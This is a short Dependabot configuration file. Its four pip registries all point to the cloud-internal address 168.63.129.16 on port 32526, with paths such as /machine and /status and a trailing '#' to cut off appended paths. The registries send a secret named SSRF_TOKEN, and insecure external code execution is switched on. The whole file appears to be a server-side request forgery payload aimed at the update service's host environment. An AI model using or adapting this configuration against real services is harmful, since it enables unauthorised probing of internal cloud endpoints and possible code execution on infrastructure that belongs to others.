version: 2
registries:
  ext-a:
    type: python-index
    url: http://168.63.129.16:32526/extensions#
    token: ${{ secrets.SSRF_TOKEN }}
  ext-b:
    type: python-index
    url: http://168.63.129.16:32526/status#
    token: ${{ secrets.SSRF_TOKEN }}
  ext-c:
    type: python-index
    url: http://168.63.129.16:32526/machine#
    token: ${{ secrets.SSRF_TOKEN }}
  ext-d:
    type: python-index
    url: http://168.63.129.16:32526/api#
    token: ${{ secrets.SSRF_TOKEN }}
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "daily"
    insecure-external-code-execution: allow
    registries:
      - ext-a
      - ext-b
      - ext-c
      - ext-d
